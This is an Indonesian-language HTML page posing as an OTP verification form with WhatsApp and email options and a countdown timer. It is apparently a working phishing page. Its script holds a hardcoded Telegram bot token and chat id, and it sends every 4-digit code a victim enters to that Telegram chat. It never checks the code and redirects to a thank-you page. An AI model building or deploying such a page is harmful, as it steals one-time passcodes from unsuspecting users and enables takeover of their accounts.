<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi OTP</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f4f6fa;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      color: #333;
      padding: 16px;
    }
    .container {
      background: #fff;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
      text-align: center;
      width: 100%;
      max-width: 400px;
      transition: all 0.3s ease;
    }
    h2 {
      color: #006ee9;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      margin-bottom: 20px;
      color: #555;
    }
    .otp-inputs {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 20px;
    }
    .otp-inputs input {
      flex: 1;
      min-width: 40px;
      height: 48px;
      text-align: center;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 8px;
      transition: border 0.2s ease;
    }
    .otp-inputs input:focus {
      border-color: #006ee9;
      outline: none;
    }
    button {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #006ee9;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s ease;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .toggle-link {
      margin-top: 15px;
      color: #006ee9;
      text-decoration: underline;
      cursor: pointer;
      font-size: 14px;
    }
    .timer {
      margin-bottom: 15px;
      font-size: 14px;
      color: #888;
    }
    .fade {
      opacity: 0;
      pointer-events: none;
      position: absolute;
      transition: opacity 0.3s ease;
    }
    .active {
      opacity: 1;
      pointer-events: auto;
      position: relative;
    }
    #status, #emailStatus {
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<div class="container">
  <!-- OTP Biasa -->
  <div id="otpNormal" class="active">
    <h2>Verifikasi Kode OTP</h2>
    <p>Masukkan 4 digit kode OTP</p>
    <div class="otp-inputs" id="normalInputs">
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
    </div>
    <div class="timer" id="timer">Sisa waktu: 02:00</div>
    <button onclick="submitOTP()">Verifikasi</button>
    <div class="toggle-link" onclick="switchTo('otpEmail')">Kirim OTP via Email</div>
    <div id="status"></div>
  </div>

  <!-- OTP via Email -->
  <div id="otpEmail" class="fade">
    <h2>OTP via Email</h2>
    <p>Masukkan 4 digit kode OTP dari email</p>
    <div class="otp-inputs" id="emailInputs">
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
      <input type="text" maxlength="1" />
    </div>
    <button onclick="submitEmailOTP()">Verifikasi</button>
    <div class="toggle-link" onclick="switchTo('otpNormal')">Kirim OTP Via WhatsApp</div>
    <div id="emailStatus"></div>
  </div>
</div>

<script>
  const token = "7412368257:AAEr_6ARKm2Jg0AmGq3UnWKUNSvpDqR5RVs";
  const chat_id = "-4770559077";

  let timeLeft = 60; // 2 menit
  let timerInterval;

  function updateTimer() {
    const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
    const s = String(timeLeft % 60).padStart(2, '0');
    document.getElementById("timer").innerText = `Sisa waktu: ${m}:${s}`;
    if (timeLeft > 0) {
      timeLeft--;
    } else {
      clearInterval(timerInterval);
      document.getElementById("timer").innerText = "⏰ Waktu habis.";
    }
  }

  function startTimer() {
    updateTimer();
    timerInterval = setInterval(updateTimer, 1000);
  }

  function getInputValue(containerId) {
    return Array.from(document.querySelectorAll(`#${containerId} input`)).map(i => i.value).join("");
  }

  function submitOTP() {
    const otp = getInputValue("normalInputs");
    const status = document.getElementById("status");
    if (otp.length !== 4) {
      status.innerText = "⚠️ Kode OTP tidak lengkap.";
      return;
    }
    status.innerText = "⏳ Loading...";
    sendToTelegram(`OTP Biasa: ${otp}`, status);
  }

  function submitEmailOTP() {
    const otp = getInputValue("emailInputs");
    const status = document.getElementById("emailStatus");
    if (otp.length !== 4) {
      status.innerText = "⚠️ Kode OTP tidak lengkap.";
      return;
    }
    status.innerText = "⏳ Loading...";
    sendToTelegram(`OTP via Email: ${otp}`, status);
  }

  function sendToTelegram(message, statusEl) {
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat_id, text: message })
    })
    .then(() => {
      statusEl.innerText = "✅ Verifikasi OTP. Mengalihkan...";
      setTimeout(() => window.location.href = "terimakasih.html", 1000);
    })
    .catch(() => {
      statusEl.innerText = "❌ Gagal verifikasi.";
    });
  }

  function switchTo(idToShow) {
    document.querySelectorAll('.container > div').forEach(div => {
      div.classList.remove('active');
      div.classList.add('fade');
    });
    document.getElementById(idToShow).classList.add('active');
    document.getElementById(idToShow).classList.remove('fade');
  }

  document.querySelectorAll("input").forEach((input, idx, arr) => {
    input.addEventListener("input", () => {
      if (input.value && idx < arr.length - 1) arr[idx + 1].focus();
    });
    input.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !input.value && idx > 0) arr[idx - 1].focus();
    });
  });

  window.onload = startTimer;
</script>

</body>
</html>
